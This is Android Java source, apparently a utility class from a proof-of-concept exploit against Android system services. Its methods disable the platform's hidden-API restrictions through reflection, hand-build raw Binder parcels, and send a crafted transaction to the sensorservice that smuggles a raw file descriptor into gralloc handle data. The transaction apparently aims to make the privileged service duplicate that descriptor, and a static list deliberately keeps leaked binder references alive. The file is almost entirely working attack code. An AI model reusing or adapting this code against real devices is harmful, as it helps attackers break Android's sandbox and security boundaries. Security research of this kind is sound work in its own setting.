package com.example.thisseemswrong;

import android.os.IBinder;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.system.ErrnoException;
import android.system.Os;
import android.util.Property;
import android.os.Process;

import androidx.annotation.NonNull;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.function.Consumer;

class MiscUtils {

    static ArrayList<Object> sLeakedStuff = new ArrayList<>();

    static void backpatchLength(@NonNull Parcel parcel, int lengthPos, int startPos) {
        int endPos = parcel.dataPosition();
        parcel.setDataPosition(lengthPos);
        parcel.writeInt(endPos - startPos);
        parcel.setDataPosition(endPos);
    }

    static void backpatchLengthString(@NonNull Parcel parcel, int startPos) {
        int endPos = parcel.dataPosition();
        parcel.setDataPosition(startPos);
        parcel.writeInt((endPos - startPos) / 2 - 3);
        parcel.setDataPosition(endPos);
    }

    static void readIntAndCheck(@NonNull Parcel source, int expectedValue, String name) {
        int actual = source.readInt();
        if (actual != expectedValue) {
            throw new RuntimeException("Unexpected <" + name + "> in reply, expected <" + expectedValue + ">, got <" + actual + ">");
        }
    }

    static void readStringAndCheck(@NonNull Parcel source, String expectedValue, String name) {
        String actual = source.readString();
        if (!actual.equals(expectedValue)) {
            throw new RuntimeException("Unexpected <" + name + "> in reply, expected <" + expectedValue + ">, got <" + actual + ">");
        }
    }

    static int myUserId() {
        return Process.myUid() / 100000;
    }

    private static boolean sAllowHiddenApisDone;

    static void allowHiddenApis() {
        if (sAllowHiddenApisDone) return;
        try {
            Method[] methods = Property.of(Class.class, Method[].class, "Methods").get(Class.forName("dalvik.system.VMRuntime"));
            Method setHiddenApiExemptions = null;
            Method getRuntime = null;
            for (Method method : methods) {
                if ("setHiddenApiExemptions".equals(method.getName())) {
                    setHiddenApiExemptions = method;
                }
                if ("getRuntime".equals(method.getName())) {
                    getRuntime = method;
                }
            }
            setHiddenApiExemptions.invoke(getRuntime.invoke(null), new Object[]{new String[]{"L"}});
        } catch (ReflectiveOperationException e) {
            throw new RuntimeException(e);
        }
        sAllowHiddenApisDone = true;
    }

    static void logInfoAboutFds(ParcelFileDescriptor[] pfds, Consumer<String> log) {
        int i = 0;
        for (ParcelFileDescriptor pfd : pfds) {
            if (pfd == null) {
                log.accept(i + " is null");
            } else {
                try {
                    String readlink = Os.readlink("/proc/self/fd/" + pfd.getFd());
                    log.accept(i + " \"" + readlink + "\"");
                } catch (ErrnoException e) {
                    log.accept(i + " thrown in readlink");
                }
            }
            i++;
        }
    }

    static void dupFdThroughSensorServer(int deviceId, int fd) throws Exception {
        IBinder service = (IBinder) Class.forName("android.os.ServiceManager")
                .getMethod("getService", String.class)
                .invoke(null, "sensorservice");

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        data.writeInterfaceToken("android.gui.SensorServer");
        data.writeString("com.example.thisseemswrong"); // opPackageName
        data.writeInt(deviceId); // deviceId
        data.writeInt(1); // size
        data.writeInt(2); // type=SENSOR_DIRECT_MEM_TYPE_GRALLOC
        data.writeInt(1); // format=SENSOR_DIRECT_FMT_SENSORS_EVENT
        data.writeInt(0); // numFds
        data.writeInt(1); // numInts
        data.writeInt(fd); // data[0]
        service.transact(5, data, reply, 0);
        sLeakedStuff.add(reply.readStrongBinder());
        reply.recycle();
        data.recycle();
    }
}
